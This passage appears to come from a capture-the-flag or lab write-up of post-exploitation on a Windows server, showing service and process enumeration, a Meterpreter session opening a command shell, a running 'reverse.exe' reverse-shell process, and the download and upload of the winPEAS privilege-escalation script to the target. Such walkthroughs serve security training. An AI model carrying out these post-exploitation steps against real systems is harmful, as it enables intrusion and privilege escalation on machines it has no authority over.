        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: WinHttpAutoProxySvc
DISPLAY_NAME: WinHTTP Web Proxy Auto-Discovery Service
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: Winmgmt
DISPLAY_NAME: Windows Management Instrumentation
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: WinRM
DISPLAY_NAME: Windows Remote Management (WS-Management)
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

```Bash
meterpreter > shell
Process 3064 created.
Channel 3 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
```

```PowerShell
C:\>cd C:\Program Files (x86)
cd Program Files (x86)
```

```PowerShell
C:\Program Files (x86)>tasklist /svc
tasklist /svc

Image Name                     PID Services                                    
========================= ======== ============================================
System Idle Process              0 N/A                                         
System                           4 N/A                                         
smss.exe                       376 N/A                                         
csrss.exe                      528 N/A                                         
csrss.exe                      584 N/A                                         
wininit.exe                    592 N/A                                         
winlogon.exe                   620 N/A                                         
services.exe                   676 N/A                                         
lsass.exe                      684 SamSs                                       
svchost.exe                    744 BrokerInfrastructure, DcomLaunch, LSM,      
                                   PlugPlay, Power, SystemEventsBroker         
svchost.exe                    788 RpcEptMapper, RpcSs                         
dwm.exe                        852 N/A                                         
svchost.exe                    884 Dhcp, EventLog, lmhosts, Wcmsvc             
svchost.exe                    912 CertPropSvc, DsmSvc, gpsvc, iphlpsvc,       
                                   LanmanServer, ProfSvc, Schedule, SENS,      
                                   SessionEnv, ShellHWDetection, Themes,       
                                   Winmgmt                                     
svchost.exe                    968 EventSystem, FontCache, netprofm, nsi,      
                                   W32Time, WinHttpAutoProxySvc                
svchost.exe                    360 CryptSvc, Dnscache, LanmanWorkstation,      
                                   NlaSvc, WinRM                               
svchost.exe                   1032 BFE, DPS, MpsSvc                            
spoolsv.exe                   1152 Spooler                                     
amazon-ssm-agent.exe          1180 AmazonSSMAgent                              
svchost.exe                   1256 AppHostSvc                                  
LiteAgent.exe                 1276 AWSLiteAgent                                
svchost.exe                   1336 TrkWks, UALSVC, UmRdpService                
svchost.exe                   1368 W3SVC, WAS                                  
WService.exe                  1428 WindowsScheduler                            
WScheduler.exe                1552 N/A                                         
Ec2Config.exe                 1656 Ec2Config                                   
WmiPrvSE.exe                  1804 N/A                                         
svchost.exe                   2000 TermService                                 
taskhostex.exe                2484 N/A                                         
explorer.exe                  2556 N/A                                         
ServerManager.exe             2952 N/A                                         
WScheduler.exe                 576 N/A                                         
msdtc.exe                     1292 MSDTC                                       
w3wp.exe                      2832 N/A                                         
cmd.exe                        536 N/A                                         
conhost.exe                   2228 N/A                                         
reverse.exe                   1608 N/A                                         
cmd.exe                       2444 N/A                                         
conhost.exe                   1632 N/A                                         
cmd.exe                       3064 N/A                                         
conhost.exe                   2984 N/A                                         
WmiPrvSE.exe                  1932 N/A                                         
tasklist.exe                  1300 N/A
```

```Bash
root@ip-10-10-5-223:~# wget https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat
--2023-07-27 17:26:30--  https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 23942 (23K) [text/plain]
Saving to: \u2018winPEASbat\u2019

winPEASbat          100%[===================>]  23.38K  --.-KB/s    in 0.03s   

2023-07-27 17:26:30 (926 KB/s) - \u2018winPEASbat\u2019 saved [23942/23942]
```

```Bash
meterpreter > upload winPEASbat
[*] Uploading  : /root/winPEASbat -> winPEASbat
[*] Uploaded 23.38 KiB of 23.38 KiB (100.0%): /root/winPEASbat -> winPEASbat
[*] Completed  : /root/winPEASbat -> winPEASbat
```

```Bash
meterpreter > ls -ali winPEASbat
100666/rw-rw-rw-  23942  fil  2023-07-27 17:28:19 +0100  winPEASbat
```
